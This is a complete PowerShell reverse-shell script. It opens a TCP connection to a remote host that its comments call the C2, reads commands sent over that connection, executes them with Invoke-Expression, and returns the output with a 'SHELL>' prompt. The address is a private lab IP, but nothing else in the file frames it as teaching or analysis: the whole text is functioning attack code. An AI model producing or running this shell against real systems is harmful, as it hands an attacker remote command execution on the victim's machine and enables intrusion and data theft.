# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9996

# Create a TCP client object
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)

# Create a stream object for sending and receiving data
$stream = $tcpClient.GetStream()
$writer = [System.IO.StreamWriter]::new($stream)
$reader = [System.IO.StreamReader]::new($stream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $writer.Write($String + 'SHELL> ')
    $writer.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the writer and the underlying TCPClient
$writer.Close()
